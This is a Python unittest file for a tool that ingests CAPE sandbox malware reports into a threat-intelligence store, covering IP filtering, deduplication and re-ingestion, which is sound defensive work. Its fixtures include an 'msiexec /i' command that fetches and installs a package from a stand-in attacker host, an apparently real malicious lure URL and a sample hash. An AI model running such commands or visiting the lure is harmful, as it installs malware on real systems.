"""Tests for the CAPE-report feeder (cape_feeder.ingest_cape_task).

Covers the real Task 76 directory when present, plus synthetic reports for
missing fields, malformed JSON, IP filtering, deduplication, and idempotent
re-ingestion. Nothing here executes a sample or touches the network.
"""

import json
import os
import shutil
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

from collection import CollectionStore, artifact_key  # noqa: E402
import cape_feeder  # noqa: E402

TASK76_DIR = "/opt/CAPEv2/storage/analyses/76"
MSI_URL = "https://i-like-ele-phants-verification.live/iamchallenge/verification/UserID7383526"


def _write_task(root, report, pcap_bytes=None):
    """Lay out a minimal CAPE task dir: <root>/reports/report.json (+dump.pcap)."""
    os.makedirs(os.path.join(root, "reports"), exist_ok=True)
    with open(os.path.join(root, "reports", "report.json"), "w") as fh:
        json.dump(report, fh)
    if pcap_bytes is not None:
        with open(os.path.join(root, "dump.pcap"), "wb") as fh:
            fh.write(pcap_bytes)
    return root


class FeederTestBase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.store = CollectionStore(os.path.join(self.tmp, "collection.db"))

    def tearDown(self):
        self.store.close()
        shutil.rmtree(self.tmp, ignore_errors=True)

    def task_path(self, name="task"):
        return os.path.join(self.tmp, name)


class TestTask76(FeederTestBase):
    @unittest.skipUnless(
        os.path.isfile(os.path.join(TASK76_DIR, "reports", "report.json")),
        "Task 76 artifacts not present on this host",
    )
    def test_ingest_real_task76(self):
        summary = cape_feeder.ingest_cape_task(self.store, TASK76_DIR)
        self.assertFalse(summary["skipped"])
        self.assertEqual(summary["task_id"], 76)
        # The attempted MSI URL is recorded, not acquired, no hash invented.
        art = self.store.artifact(artifact_key(url=MSI_URL))
        self.assertIsNotNone(art)
        self.assertEqual(art["acquisition_status"], "not_acquired")
        self.assertIsNone(art["sha256"])
        self.assertEqual(art["served_by_domain"], "i-like-ele-phants-verification.live")
        self.assertEqual(art["cape_task_id"], 76)
        # The submitted .bat is the one artifact with a real sha256.
        acquired = [r for r in self.store._conn.execute(
            "SELECT * FROM payload_artifacts WHERE acquisition_status='acquired'")]
        self.assertEqual(len(acquired), 1)
        self.assertEqual(
            acquired[0]["sha256"],
            "86ac6abe9e676d912c201609dcd04b710f778056b460108412a2b0c2611801b8",
        )
        # The malicious domain was observed; no private/gateway IP collected.
        self.assertIsNotNone(self.store.domain("i-like-ele-phants-verification.live"))
        for r in self.store._conn.execute("SELECT ip FROM ips"):
            self.assertTrue(cape_feeder._is_routable(r["ip"]), f"{r['ip']} should be routable")


class TestSyntheticReports(FeederTestBase):
    def _report(self, **over):
        rep = {
            "info": {"id": 101, "started": "2026-10-15 02:19:52", "ended": "2026-10-15 02:23:52",
                     "machine": {"name": "cuckoo1"}},
            "target": {"category": "file", "file": {
                "name": "launch.bat", "size": 94, "type": "ASCII text",
                "sha256": "a" * 64}},
            "network": {
                "dns": [
                    {"request": "evil.example.live", "type": "A", "answers": [{"data": "45.33.32.156"}]},
                    {"request": "noanswer.example", "type": "A", "answers": []},
                ],
                "hosts": [], "dead_hosts": [["8.8.8.8", 53]],
                "tcp": [{"src": "192.168.1.155", "dst": "192.168.1.1", "dport": 53},
                        {"src": "192.168.1.155", "dst": "45.33.32.156", "dport": 443}],
                "http": [], "tls": [],
            },
            "signatures": [
                {"name": "cmdline_http_link",
                 "data": [{"command": "msiexec /i https://evil.example.live/pay/load.msi"}]},
            ],
            "behavior": {"processtree": [
                {"pid": 1, "command_line": "cmd /c start evil",
                 "children": [{"pid": 2,
                               "command_line": "msiexec /i https://evil.example.live/pay/load.msi"}]},
            ]},
        }
        rep.update(over)
        return rep

    def test_full_report_counts_and_filtering(self):
        _write_task(self.task_path(), self._report())
        summary = cape_feeder.ingest_cape_task(self.store, self.task_path())
        self.assertEqual(summary["task_id"], 101)
        st = self.store.stats()
        # domains: evil.example.live, noanswer.example (DNS) -- MSI host dedups
        self.assertEqual(st["domains"], 2)
        # routable public IPs survive (resolution + dead_host); private gateway dropped
        collected = sorted(r["ip"] for r in self.store._conn.execute("SELECT ip FROM ips"))
        self.assertEqual(collected, ["45.33.32.156", "8.8.8.8"])
        self.assertNotIn("192.168.1.1", collected)
        # one acquired (.bat) + one not_acquired (.msi url)
        self.assertEqual(st["artifacts_acquired"], 1)
        self.assertEqual(st["artifacts_not_acquired"], 1)
        msi = self.store.artifact(artifact_key(url="https://evil.example.live/pay/load.msi"))
        self.assertEqual(msi["artifact_type"], "msi")
        self.assertEqual(msi["acquisition_status"], "not_acquired")
        self.assertIsNone(msi["sha256"])

    def test_missing_sections_are_unknown_not_error(self):
        # No network, no signatures, no target file -- must not raise, just few rows.
        rep = {"info": {"id": 202}}
        _write_task(self.task_path(), rep)
        summary = cape_feeder.ingest_cape_task(self.store, self.task_path())
        self.assertFalse(summary["skipped"])
        self.assertEqual(summary["task_id"], 202)
        st = self.store.stats()
        self.assertEqual(st["domains"], 0)
        self.assertEqual(st["artifacts"], 0)

    def test_no_sha_means_no_acquired_artifact(self):
        rep = self._report(target={"category": "file", "file": {"name": "x.bat"}})  # no sha256
        _write_task(self.task_path(), rep)
        cape_feeder.ingest_cape_task(self.store, self.task_path())
        self.assertEqual(self.store.stats()["artifacts_acquired"], 0)

    def test_malformed_json_raises_feeder_error(self):
        root = self.task_path("bad")
        os.makedirs(os.path.join(root, "reports"))
        with open(os.path.join(root, "reports", "report.json"), "w") as fh:
            fh.write("{not valid json,,,")
        with self.assertRaises(cape_feeder.FeederError):
            cape_feeder.ingest_cape_task(self.store, root)

    def test_missing_report_raises_feeder_error(self):
        with self.assertRaises(cape_feeder.FeederError):
            cape_feeder.ingest_cape_task(self.store, self.task_path("nonexistent"))

    def test_toplevel_not_object_raises(self):
        root = self.task_path("arr")
        os.makedirs(os.path.join(root, "reports"))
        with open(os.path.join(root, "reports", "report.json"), "w") as fh:
            json.dump([1, 2, 3], fh)
        with self.assertRaises(cape_feeder.FeederError):
            cape_feeder.ingest_cape_task(self.store, root)


class TestIdempotency(FeederTestBase):
    def test_second_ingest_is_noop(self):
        _write_task(self.task_path(), TestSyntheticReports._report(self))
        first = cape_feeder.ingest_cape_task(self.store, self.task_path())
        before = self.store.stats()
        second = cape_feeder.ingest_cape_task(self.store, self.task_path())
        after = self.store.stats()
        self.assertFalse(first["skipped"])
        self.assertTrue(second["skipped"])
        self.assertEqual(before, after)  # no new rows, no counter inflation

    def test_counters_not_inflated_on_reingest(self):
        _write_task(self.task_path(), TestSyntheticReports._report(self))
        cape_feeder.ingest_cape_task(self.store, self.task_path())
        dom = self.store.domain("evil.example.live")
        seen_before = dom["times_seen"]
        cape_feeder.ingest_cape_task(self.store, self.task_path())  # skipped
        self.assertEqual(self.store.domain("evil.example.live")["times_seen"], seen_before)

    def test_force_reingests(self):
        _write_task(self.task_path(), TestSyntheticReports._report(self))
        cape_feeder.ingest_cape_task(self.store, self.task_path())
        again = cape_feeder.ingest_cape_task(self.store, self.task_path(), force=True)
        self.assertFalse(again["skipped"])
        # forced re-ingest bumps the sighting counter but adds no rows
        self.assertEqual(self.store.stats()["domains"], 2)
        self.assertEqual(self.store.domain("evil.example.live")["times_seen"], 2)

    def test_task_id_override_and_source(self):
        _write_task(self.task_path(), {"info": {}})  # no id in report
        summary = cape_feeder.ingest_cape_task(self.store, self.task_path(),
                                               task_id=999, source="cape:999")
        self.assertEqual(summary["task_id"], 999)


if __name__ == "__main__":
    unittest.main()
